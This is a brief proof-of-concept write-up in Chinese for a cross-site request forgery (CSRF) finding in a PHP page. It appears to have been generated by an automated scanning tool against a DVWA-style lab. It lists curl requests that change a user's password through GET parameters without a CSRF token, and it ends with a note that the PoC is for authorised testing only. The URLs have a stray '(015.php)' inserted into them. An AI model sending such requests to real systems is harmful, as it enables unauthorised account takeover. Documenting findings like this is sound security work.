# POC — 密码修改接口无 CSRF token，可跨站强制改密

- finding_id: `LLM-db88415cbc34`
- type: `csrf` / CWE-352
- severity: `medium`
- file: `015.php:69`

## 步骤

1. **确认目标可达且已获授权**  
```http
curl -sS -i 'http://TARGET:8080/vulnerabilities/captcha/ (015.php)'
```
预期：返回应用页面/接口响应，而不是连接失败

2. **发送 跨站请求伪造 载荷**  
```http
curl -sS -i -X GET 'http://TARGET:8080/vulnerabilities/captcha/ (015.php)?Change=Change&password_new=SUNSET_NEW&password_conf=SUNSET_NEW'
```
预期：状态改变请求被接受或进入下一步流程

3. **读取账户状态/重新登录确认状态确实改变**  
预期：密码或业务状态已改变；请求无需 CSRF token/有效验证码

## 安全说明

POC 仅为文本工件；落日二号不会执行它，也不会联网或搭建沙箱。仅限授权测试。